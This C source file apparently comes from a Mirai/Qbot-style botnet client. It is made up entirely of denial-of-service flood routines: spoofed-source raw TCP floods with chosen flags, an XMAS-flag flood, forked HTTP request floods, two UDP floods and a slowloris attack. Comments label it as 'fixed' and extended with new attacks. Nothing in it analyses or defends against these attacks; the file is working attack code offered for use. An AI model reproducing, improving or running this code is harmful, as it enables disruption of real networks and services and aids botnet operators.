#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <limits.h>
#include <openssl/sha.h>

#define PHI 0x9e3779b9
#define STD_PIGZ 50
#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))
#define MAXTTL 255

int getip(unsigned char *toGet, struct in_addr *i);
typedef char BOOL;
typedef uint32_t ipv4_t;
typedef uint16_t port_t;
static uint32_t x, y, z, w;
uint32_t scanPid;
struct in_addr ourIP;
ipv4_t LOCAL_ADDR;
static uint32_t Q[4096], c = 362436;

void init_rand(uint32_t x) {
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++) 
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

uint32_t rand_cmwc(void) {
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (uint32_t)(t >> 32);
    x = t + c;
    if (x < c) {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

int getHost(unsigned char *toGet, struct in_addr *i) {
    struct hostent *h;
    if ((i->s_addr = inet_addr(toGet)) == -1) 
        return 1;
    return 0;
}

uint32_t rand_next(void) {
    uint32_t t = x;
    t ^= t << 11;
    t ^= t >> 8;
    x = y; y = z; z = w;
    w ^= w >> 19;
    w ^= t;
    return w;
}

in_addr_t getRandomIP(in_addr_t netmask) {
    in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
    return tmp ^ (rand_cmwc() & ~netmask);
}

unsigned short csum (unsigned short *buf, int count) {
    register uint64_t sum = 0;
    while (count > 1) { 
        sum += *buf++; 
        count -= 2; 
    }
    if (count > 0) 
        sum += *(unsigned char *)buf;
    while (sum >> 16) 
        sum = (sum & 0xffff) + (sum >> 16);
    return (uint16_t)(~sum);
}

// 𝖥𝖨𝖷𝖤𝖣: 𝖭𝖮 𝖬𝖤𝖬𝖮𝖱𝖸 𝖫𝖤𝖠𝖪𝖲
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {
    struct tcp_pseudo {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;
    
    unsigned short total_len = iph->tot_len;
    pseudohead.src_addr = iph->saddr;
    pseudohead.dst_addr = iph->daddr;
    pseudohead.zero = 0;
    pseudohead.proto = IPPROTO_TCP;
    pseudohead.length = htons(sizeof(struct tcphdr));
    
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
    unsigned char tcp_buffer[sizeof(struct tcp_pseudo) + sizeof(struct tcphdr)];
    
    memcpy(tcp_buffer, &pseudohead, sizeof(struct tcp_pseudo));
    memcpy(tcp_buffer + sizeof(struct tcp_pseudo), (unsigned char *)tcph, sizeof(struct tcphdr));
    
    unsigned short output = csum((unsigned short *)tcp_buffer, totaltcp_len);
    return output;
}

void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + packetSize;
    iph->id = rand_cmwc();
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = protocol;
    iph->check = 0;
    iph->saddr = source;
    iph->daddr = dest;
}

// 𝖥𝖨𝖷𝖤𝖣: 𝖡𝖤𝖳𝖳𝖤𝖱 𝖤𝖱𝖱𝖮𝖱 𝖧𝖠𝖭𝖣𝖫𝖨𝖭𝖦
void SendTCP(unsigned char *target, int port, int timeEnd, unsigned char *flags) {
    if (!target || !flags) return;
    
    int packetsize = 0;
    int pollinterval = 10;
    int spoofit = 32;
    register unsigned int pollRegister;
    pollRegister = pollinterval;
    
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    
    if (port == 0) 
        dest_addr.sin_port = rand_cmwc();
    else 
        dest_addr.sin_port = htons(port);
        
    if (getHost(target, &dest_addr.sin_addr)) 
        return;
        
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd <= 0) {
        return;
    }
    
    int tmp = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0) {
        close(sockfd);
        return;
    }
    
    in_addr_t netmask;
    if (spoofit == 0) 
        netmask = (~((in_addr_t) -1));
    else 
        netmask = (~((1 << (32 - spoofit)) - 1));
    
    unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
    
    makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl(getRandomIP(netmask)), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);
    
    tcph->source = rand_cmwc();
    tcph->seq = rand_cmwc();
    tcph->ack_seq = 0;
    tcph->doff = 5;
    
    if (!strcmp(flags, "all")) {
        tcph->syn = 1;
        tcph->rst = 1;
        tcph->fin = 1;
        tcph->ack = 1;
        tcph->psh = 1;
    } else {
        unsigned char *pch = strtok(flags, ",");
        while (pch) {
            if (!strcmp(pch, "syn")) { 
                tcph->syn = 1;
            } else if (!strcmp(pch, "rst")) { 
                tcph->rst = 1;
            } else if (!strcmp(pch, "fin")) { 
                tcph->fin = 1;
            } else if (!strcmp(pch, "ack")) { 
                tcph->ack = 1;
            } else if (!strcmp(pch, "psh")) { 
                tcph->psh = 1;
            }
            pch = strtok(NULL, ",");
        }
    }
    
    tcph->window = rand_cmwc();
    tcph->check = 0;
    tcph->urg_ptr = 0;
    tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
    tcph->check = tcpcsum(iph, tcph);
    iph->check = csum((unsigned short *) packet, iph->tot_len);
    
    int end = time(NULL) + timeEnd;
    register unsigned int i = 0;
    
    while (1) {
        if (sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) <= 0) {
            break;
        }
        
        iph->saddr = htonl(getRandomIP(netmask));
        iph->id = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->source = rand_cmwc();
        tcph->check = 0;
        tcph->check = tcpcsum(iph, tcph);
        iph->check = csum((unsigned short *) packet, iph->tot_len);
        
        if (i == pollRegister) {
            if (time(NULL) > end) break;
            i = 0;
            continue;
        }
        i++;
    }
    
    close(sockfd);
}

int socket_connect(char *host, in_port_t port) {
    struct hostent *hp;
    struct sockaddr_in addr;
    int on = 1, sock;     
    
    if ((hp = gethostbyname(host)) == NULL) 
        return 0;
        
    bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;
    
    sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == -1) 
        return 0;
        
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
    
    if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) {
        close(sock);
        return 0;
    }
    
    return sock;
}

// 𝖥𝖨𝖷𝖤𝖣: 𝖡𝖤𝖳𝖳𝖤𝖱 𝖥𝖮𝖱𝖪 𝖧𝖠𝖭𝖣𝖫𝖨𝖭𝖦
void SendHTTP(char *method, char *host, in_port_t port, char *path, int timeEnd, int power) {
    if (!method || !host || !path) return;
    
    const char *useragents[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36", 
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36"
    };
    int useragents_count = sizeof(useragents) / sizeof(useragents[0]);

    int i;
    for (i = 0; i < power; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            char request[512];
            char buffer[1];
            time_t end = time(NULL) + timeEnd;
            
            snprintf(request, sizeof(request), "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", 
                    method, path, host, useragents[rand() % useragents_count]);
            
            while (time(NULL) < end) {
                int socket_fd = socket_connect(host, port);
                if (socket_fd > 0) {
                    write(socket_fd, request, strlen(request));
                    read(socket_fd, buffer, 1);
                    close(socket_fd);
                }
                usleep(10000);
            }
            _exit(0);
        } else if (pid < 0) {
            break;
        }
    }
}

// 𝖥𝖨𝖷𝖤𝖣: 𝖡𝖴𝖥𝖥𝖤𝖱 𝖲𝖨𝖹𝖤 𝖲𝖠𝖥𝖤𝖳𝖸
void sendSTD(unsigned char *ip, int port, int secs) {
    if (!ip) return;
    
    int iSTD_Sock;
    iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (iSTD_Sock <= 0) return;
    
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    
    hp = gethostbyname(ip);
    if (!hp) {
        close(iSTD_Sock);
        return;
    }
    
    bzero((char*) &sin, sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = htons(port);
    
    unsigned int a = 0;
    
    while (1) {
        char *randstrings[] = {
            "VSzNC0CJti3ouku", "yhJyMAqx7DZa0kg", "1Cp9MEDMN6B5L1K", 
            "miraiMIRAI", "stdflood4", "7XLPHoxkvL", "jmQvYBdRZA", 
            "eNxERkyrfR", "qHjTXcMbzH", "chickennuggets", "ilovecocaine",
            "666666", "88888888", "0nnf0l20im", "uq7ajzgm0a", "loic"
        };
        int strings_count = sizeof(randstrings) / sizeof(randstrings[0]);
        
        char *STD2_STRING = randstrings[rand() % strings_count];
        
        if (a >= 50) {
            send(iSTD_Sock, STD2_STRING, STD_PIGZ, 0);
            connect(iSTD_Sock, (struct sockaddr *) &sin, sizeof(sin));
            
            if (time(NULL) >= start + secs) {
                close(iSTD_Sock);
                _exit(0);
            }
            a = 0;
        }
        a++;
        usleep(1000);
    }
}

void rand_alphastr(uint8_t *str, int len) {
    if (!str || len <= 0) return;
    
    char alpha_set[] = "qwertyuiopasdfghjklzxcvbnm1234567890";
    int alpha_len = strlen(alpha_set);
    
    while (len--) {
        *str++ = alpha_set[rand_next() % alpha_len];
    }
}

in_addr_t findRandIP(in_addr_t netmask) {
    in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
    return tmp ^ (rand_cmwc() & ~netmask);
}

void xmas(unsigned char *target, int port, int timeEnd) {
    if (!target) return;
    
    int spoofit = 32;
    int packetsize = 0;
    int pollinterval = 10;
    register unsigned int pollRegister;
    pollRegister = pollinterval;

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    
    if (port == 0) 
        dest_addr.sin_port = rand_cmwc();
    else 
        dest_addr.sin_port = htons(port);
        
    if (getHost(target, &dest_addr.sin_addr)) 
        return;
        
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd <= 0) {
        return;
    }

    int tmp = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0) {
        close(sockfd);
        return;
    }

    in_addr_t netmask;
    if (spoofit == 0) 
        netmask = (~((in_addr_t) -1));
    else 
        netmask = (~((1 << (32 - spoofit)) - 1));

    unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

    makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl(findRandIP(netmask)), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

    tcph->source = rand_cmwc();
    tcph->seq = rand_cmwc();
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->ack = 1;
    tcph->syn = 1;
    tcph->psh = 1;
    tcph->urg = 1;
    tcph->window = rand_cmwc();
    tcph->check = 0;
    tcph->urg_ptr = 0;
    tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
    tcph->check = tcpcsum(iph, tcph);
    iph->check = csum((unsigned short *) packet, iph->tot_len);

    int end = time(NULL) + timeEnd;
    register unsigned int i = 0;
    
    while (1) {
        if (sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) <= 0) {
            break;
        }

        iph->saddr = htonl(findRandIP(netmask));
        iph->id = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->source = rand_cmwc();
        tcph->check = 0;
        tcph->check = tcpcsum(iph, tcph);
        iph->check = csum((unsigned short *) packet, iph->tot_len);

        if (i == pollRegister) {
            if (time(NULL) > end) break;
            i = 0;
            continue;
        }
        i++;
    }
    
    close(sockfd);
}

// 𝖥𝖨𝖷𝖤𝖣: 𝖬𝖤𝖬𝖮𝖱𝖸 𝖫𝖤𝖠𝖪 𝖥𝖨𝖷
void udpattack(unsigned char *target, int port, int secs, int packetsize) {
    if (!target || packetsize <= 0) return;
    
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    
    if (port == 0) 
        dest_addr.sin_port = rand_next();
    else 
        dest_addr.sin_port = htons(port);
        
    dest_addr.sin_addr.s_addr = inet_addr(target);
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    
    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sockfd <= 0) {
        return;
    }
    
    unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
    if (buf == NULL) {
        close(sockfd);
        return;
    }
    
    memset(buf, 0, packetsize + 1);
    rand_alphastr(buf, packetsize);
    
    time_t start = time(NULL);
    
    while (1) {
        if (sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) <= 0) {
            break;
        }
        
        if (time(NULL) >= start + secs) {
            break;
        }
        usleep(1000);
    }
    
    free(buf);
    close(sockfd);
}

// 𝖭𝖤𝖶: 𝖲𝖫𝖮𝖶𝖫𝖮𝖱𝖨𝖲 𝖠𝖳𝖳𝖠𝖢𝖪
void send_slowloris(char *host, int port, int timeEnd) {
    if (!host) return;
    
    int i;
    char request[512];
    
    for (i = 0; i < 500; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            time_t start = time(NULL);
            while (time(NULL) < start + timeEnd) {
                int sock = socket_connect(host, port);
                if (sock > 0) {
                    snprintf(request, sizeof(request), "GET / HTTP/1.1\r\nHost: %s\r\n", host);
                    send(sock, request, strlen(request), MSG_NOSIGNAL);
                    sleep(timeEnd);
                    close(sock);
                }
                usleep(100000);
            }
            _exit(0);
        } else if (pid < 0) {
            break;
        }
    }
}